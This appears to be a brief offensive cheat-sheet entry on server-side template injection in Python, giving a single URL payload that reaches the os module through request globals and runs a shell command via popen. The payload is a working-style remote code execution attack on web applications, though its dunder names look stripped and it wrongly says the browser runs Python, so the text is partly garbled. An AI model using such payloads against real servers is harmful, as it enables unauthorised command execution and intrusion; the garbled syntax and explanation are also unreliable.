# Server Side Template Injection

### MRO - Python

Below is using Method Resolution Order (MRO) as the web browser in this case uses Python

```
http://URL/{{request.application.globals.builtins.import('os').popen('ls -l').read()}}
```
